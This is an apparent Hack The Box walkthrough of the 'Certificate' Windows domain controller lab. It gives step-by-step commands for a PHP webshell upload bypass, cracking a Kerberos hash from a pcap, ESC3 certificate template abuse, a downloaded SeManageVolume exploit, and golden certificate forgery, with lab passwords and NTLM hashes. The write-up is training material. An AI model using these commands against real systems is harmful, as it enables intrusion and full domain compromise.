## Machine Information
- **IP Address:** 10.10.11.71
- **OS:** Windows Server 2019 (Domain Controller)
- **Domain:** certificate.htb
- **Difficulty:** Medium

## Summary
The HTB Certificate machine involves exploiting a Windows Domain Controller with Active Directory Certificate Services (ADCS) to escalate privileges from web application compromise to Domain Administrator. The attack chain includes file upload bypass, database credential extraction, Kerberos attack, certificate template abuse, and privilege escalation through SeManageVolume exploit.

---

## Step-by-Step Walkthrough

### 1. Initial Reconnaissance

#### Time Synchronization (Critical for Kerberos)
```bash
sudo ntpdate 10.10.11.71
```

#### Nmap Full Port Scan
```bash
nmap -A -p- -T4 -v -Pn -oX certificate_tcp.scan 10.10.11.71
```

**Key Findings:**
- Port 80: Apache HTTP Server
- Port 88: Kerberos
- Port 389/636: LDAP/LDAPS
- Port 445: SMB
- Port 5985: WinRM

---

### 2. Web Application Enumeration

#### Add Domain to Hosts File
```bash
echo "10.10.11.71 certificate.htb DC01.certificate.htb" | sudo tee -a /etc/hosts
```

#### Directory Enumeration
```bash
gobuster dir -u http://certificate.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -t 50
```

**Key Findings:**
- `/register.php` - User registration
- `/login.php` - User login
- `/upload.php` - File upload functionality
- `/db.php` - Database configuration

---

### 3. Web Application Exploitation

#### User Registration
```bash
curl -X POST -d "first_name=Test&last_name=User&email=test@test.com&username=testuser&password=password123&password-confirm=password123&role=student" http://certificate.htb/register.php -L
```

#### User Login and Session Cookie Capture
```bash
curl -c cookies.txt -X POST -d "username=testuser&password=password123" http://certificate.htb/login.php -L
```

#### Enroll in Course to Access Upload Functionality
```bash
curl -b cookies.txt -s "http://certificate.htb/course-details.php?id=1&action=enroll"
```

#### Create Concatenated ZIP File for Upload Bypass
```bash
# Create a valid PDF file
cat > valid.pdf << 'EOF'
%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
>>
endobj
xref
0 4
trailer
<<
/Size 4
/Root 1 0 R
>>
%%EOF
EOF

# Create PHP webshell
echo '<?php echo shell_exec($_GET["c"]); ?>' > cmd.php

# Create ZIP with PHP shell
zip payload.zip cmd.php

# Create concatenated file
cat valid.pdf payload.zip > final_concatenated.pdf
```

#### Upload Malicious File
```bash
curl -b cookies.txt -X POST -F "file=@final_concatenated.pdf" -F "info=How to be the employee of the month! - Quizz-1" -F "quizz_id=5" "http://certificate.htb/upload.php?s_id=5"
```

---

### 4. Initial Access via Database Compromise

Based on the walkthrough, the database credentials are:
- **Username:** `certificate_webapp_user`
- **Password:** `cert!f!c@teDBPWD`

From the database dump, we find the user hash for `sara.b` which cracks to: `Blink182`

#### Connect as Sara.B
```bash
evil-winrm -i 10.10.11.71 -u sara.b -p 'Blink182'
```

---

### 5. Lateral Movement via Kerberos Attack

#### Download Packet Capture File
```powershell
# In Evil-WinRM session
cd Documents\WS-01
download WS-01_PktMon.pcap
```

#### Extract Kerberos Hash from PCAP
```bash
# Analyze PCAP with tshark
tshark -r WS-01_PktMon.pcap -Y "kerberos.msg_type == 10" -T fields -e kerberos.cipher -e kerberos.realm -e kerberos.cname_string

# Extract username and cipher data
tshark -r WS-01_PktMon.pcap -Y "kerberos.msg_type == 10" -V | grep -A 20 -B 5 "cname"
```

#### Create Kerberos Hash for Hashcat
```bash
echo '$krb5pa$18$Lion.SK$CERTIFICATE.HTB$23f5159fa1c66ed7b0e561543eba6c010cd31f7e4a4377c2925cf306b98ed1e4f3951a50bc083c9bc0f16f0f586181c9d4ceda3fb5e852f0' > kerberos.hash
```

#### Crack Kerberos Hash
```bash
hashcat -m 19900 kerberos.hash /usr/share/wordlists/rockyou.txt --force
```

**Result:** `Lion.SK:!QAZ2wsx`

#### Connect as Lion.SK and Retrieve User Flag
```bash
evil-winrm -i 10.10.11.71 -u lion.sk -p '!QAZ2wsx'
```

```powershell
# Navigate to user desktop
cd Desktop
cat user.txt
```

🎉 **USER FLAG OBTAINED** 🎉

---

### 6. Active Directory Certificate Services Abuse

#### Bloodhound Enumeration
```bash
bloodhound-python -d CERTIFICATE.HTB -u lion.sk -p '!QAZ2wsx' -gc dc01.certificate.htb -c all -ns 10.10.11.71
```

#### Find Vulnerable Certificate Templates
```bash
certipy-ad find -vulnerable -u lion.sk@certificate.htb -p '!QAZ2wsx' -dc-ip 10.10.11.71 -stdout
```

**Key Finding:** ESC3 vulnerability in "Delegated-CRA" template

#### Request Enrollment Agent Certificate
```bash
certipy-ad req -u 'lion.sk@CERTIFICATE.HTB' -p '!QAZ2wsx' -dc-ip '10.10.11.71' -target 'DC01.CERTIFICATE.HTB' -ca 'Certificate-LTD-CA' -template 'Delegated-CRA'
```

#### Perform On-Behalf-Of Attack for ryan.k
```bash
certipy-ad req -u 'lion.sk@CERTIFICATE.HTB' -p '!QAZ2wsx' -dc-ip '10.10.11.71' -target 'DC01.CERTIFICATE.HTB' -ca 'Certificate-LTD-CA' -template 'SignedUser' -pfx 'lion.sk.pfx' -on-behalf-of 'CERTIFICATE\ryan.k'
```

#### Authenticate as ryan.k
```bash
certipy-ad auth -pfx 'ryan.k.pfx' -dc-ip '10.10.11.71'
```

**Result:** `ryan.k:aad3b435b51404eeaad3b435b51404ee:b1bc3d70e70f4f36b1509a65ae1a2ae6`

---

### 7. Privilege Escalation via SeManageVolume

#### Connect as ryan.k
```bash
evil-winrm -i 10.10.11.71 -u ryan.k -H b1bc3d70e70f4f36b1509a65ae1a2ae6
```

#### Download and Execute SeManageVolume Exploit
```bash
# Download exploit
curl -L -o SeManageVolumeExploit.exe https://github.com/CsEnox/SeManageVolumeExploit/releases/download/public/SeManageVolumeExploit.exe

# Upload to target
upload SeManageVolumeExploit.exe

# Execute exploit
./SeManageVolumeExploit.exe
```

---

### 8. Golden Certificate Attack

#### Check Available Certificates
```powershell
certutil -Store My
```

#### Export Root CA Certificate
```powershell
certutil -exportPFX My 75b2f4bbf31f108945147b466131bdca cert.pfx
```
*Press Enter when prompted for password (passwordless export)*

#### Download Certificate
```powershell
download cert.pfx
```

#### Forge Golden Ticket Certificate
```bash
certipy-ad forge -ca-pfx cert.pfx -out golden_ticket.pfx -upn Administrator
```

#### Authenticate as Administrator
```bash
certipy-ad auth -pfx golden_ticket.pfx -dc-ip 10.10.11.71 -user Administrator -domain CERTIFICATE.HTB
```

**Result:** `Administrator:aad3b435b51404eeaad3b435b51404ee:d804304519bf0143c14cbf1c024408c6`

---

### 9. Domain Administrator Access

#### Connect as Administrator
```bash
evil-winrm -i 10.10.11.71 -u Administrator -H d804304519bf0143c14cbf1c024408c6
```

#### Retrieve Root Flag
```powershell
cd Desktop
cat root.txt
```

🎉 **ROOT FLAG OBTAINED** 🎉

---

## Attack Chain Summary

1. **Web App Exploit** → Initial foothold via concatenated ZIP upload
2. **Database Compromise** → Extract user credentials (`sara.b:Blink182`)
3. **Kerberos Attack** → PCAP analysis and hash cracking (`Lion.SK:!QAZ2wsx`)
4. **Certificate Template Abuse** → ESC3 exploitation to obtain `ryan.k` access
5. **Privilege Escalation** → SeManageVolume exploit for enhanced permissions
6. **Golden Certificate** → Forge CA certificate for Administrator access
7. **Domain Admin** → Full domain compromise

## Key Techniques Demonstrated

- **File Upload Bypass:** Concatenated ZIP technique
- **Kerberos Attacks:** AS-REP roasting from network capture
- **ADCS Exploitation:** ESC3 vulnerability and on-behalf-of attacks
- **Windows Privilege Escalation:** SeManageVolume abuse
- **Certificate Forgery:** Golden ticket via compromised CA certificate
- **Lateral Movement:** Multiple credential harvesting techniques

## Tools Used

- **Reconnaissance:** nmap, gobuster
- **Web Exploitation:** curl, custom payloads
- **Network Analysis:** tshark, Wireshark
- **Password Cracking:** hashcat
- **AD Enumeration:** bloodhound-python
- **Certificate Abuse:** certipy-ad
- **Windows Access:** evil-winrm
- **Privilege Escalation:** SeManageVolumeExploit

---

